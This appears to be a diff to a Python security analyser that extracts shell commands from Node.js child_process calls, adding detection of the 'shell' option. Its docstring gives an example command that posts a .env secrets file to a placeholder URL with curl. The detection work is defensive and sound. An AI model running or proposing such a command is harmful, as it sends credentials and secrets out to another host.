@@ -8160,6 +8160,9 @@ _CODE_INTERPOLATION_RES = {
 }
 # Node's child_process calls that run a command.
 _JS_COMMAND_CALL_RE = re.compile(r"\b(spawn|spawnSync|execFile|execFileSync|exec|execSync)\s*\(")
+# A child_process option that runs the command in a shell: shell set to true
+# or to a shell's path, not to false, 0, null, undefined or "".
+_JS_SHELL_OPTION_RE = re.compile(r"(?<![\w$.])shell\s*:\s*(?!(?:false|0|null|undefined)\b|''|\"\")[^\s,}]")
 # Perl's qx and Ruby's %x quotes, and the bracket pairs that may delimit them.
 _CODE_QX_RE = re.compile(r"(?<![\w$@%])(?:qx|%x)\s*([^\w\s])")
 _CODE_QX_BRACKET_RES = {
@@ -10125,11 +10128,13 @@ def _node_shell_commands(reader: _CodeReader) -> list[str]:
 
     exec and execSync run their first argument as a shell command; spawn,
     spawnSync, execFile and execFileSync run a program with an argument
-    array, quoted back into one command with shlex.join. Arguments are read
-    with _code_rendered, so a URL or path in a variable reads as
-    _CODE_PLACEHOLDER. An array with a spread item, or an argument list that
-    is not an array literal, is skipped. Code that does not name
-    child_process runs none.
+    array, quoted back into one command with shlex.join. With a shell option
+    (_JS_SHELL_OPTION_RE), as in spawnSync("curl -d @.env URL", {shell: true}),
+    they run the program and its arguments, joined by spaces, as a shell
+    command. Arguments are read with _code_rendered, so a URL or path in a
+    variable reads as _CODE_PLACEHOLDER. An array with a spread item, or an
+    argument list that is neither an array literal nor options with a shell,
+    is skipped. Code that does not name child_process runs none.
     """
     if "child_process" not in reader.code:
         return []
@@ -10150,16 +10155,25 @@ def _node_shell_commands(reader: _CodeReader) -> list[str]:
             commands.append(program)
             continue
         argv = [program]
+        options: tuple[int, int] | None = None
         if len(arguments) > 1:
             items_start = arguments[1][0] + _code_blank_prefix(reader.code, *arguments[1])
             items_close = reader.pairs.get(items_start)
-            if masked[items_start : items_start + 1] != "[" or items_close is None:
+            if masked[items_start : items_start + 1] == "{":
+                options = arguments[1]
+            elif masked[items_start : items_start + 1] != "[" or items_close is None:
                 continue
-            items = [_code_rendered(reader, *item) for item in _code_arguments(reader, items_start, items_close)]
-            if any(item is None for item in items):
-                continue
-            argv += [str(item) for item in items]
-        commands.append(shlex.join(argv))
+            else:
+                items = [_code_rendered(reader, *item) for item in _code_arguments(reader, items_start, items_close)]
+                if any(item is None for item in items):
+                    continue
+                argv += [str(item) for item in items]
+                options = arguments[2] if len(arguments) > 2 else None
+        if options is not None and _JS_SHELL_OPTION_RE.search(reader.short, *options):
+            # Node joins the program and its arguments with spaces and runs them in a shell.
+            commands.append(" ".join(argv))
+        elif options is None or options is not arguments[1]:
+            commands.append(shlex.join(argv))
     return commands
 
 
